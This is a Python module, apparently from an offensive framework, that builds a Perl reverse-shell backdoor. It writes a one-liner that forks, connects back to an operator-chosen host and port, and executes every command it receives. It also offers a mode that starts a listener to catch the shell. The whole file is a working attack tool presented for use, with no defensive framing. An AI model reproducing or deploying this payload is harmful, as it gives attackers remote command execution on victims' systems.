import time,socket,os
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "nc_perl_2_reverse_tcp",
        "title"       : "Payload perl",
        "module"      : "payloads/nc/perl/reverse_tcp unix linux",
        "description" : "Payload creation and exploitation"
}

options ={
  "LHOST" : [str(var.all_var['lhost']),'The listen address'],
  "LPORT" : [str(var.all_var['lport']),'The listen port'],
  "LNAME" : [str(var.all_var['lname']),'The name of payload [payload.pl]'],
  "LTYPE" : [str(var.all_var['ltype']),'Choose listen or create <listen / create>']
}

def running():
    try:
        if var.all_var['ltype'].lower() == "create":
            print ("")
            print (blue+"[*]"+default+ "Create a backdour")
            time.sleep(2)
            print ("")
            time.sleep(2)
            print ("")
            print (green_underline+"[*] Done"+default)
            time.sleep(2)
            print ("")
            mark  = '"'
            mark2 = ':'
            f = open(var.all_var['lname'] , 'w')
            payload = '''
perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"'''+var.all_var['lhost']+mark2+var.all_var['lport']+mark+''' );STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'

'''
            f.write(payload)
            f.close()

        elif var.all_var['ltype'].lower() == "listen":
            from waf.libs import listen
            listen.run()

        else:
            print (red+"[-]"+default+"Choose LTYPE " )
    except Exception as e:
        print(red+"\n[-]"+default+"Error : "+str(e))
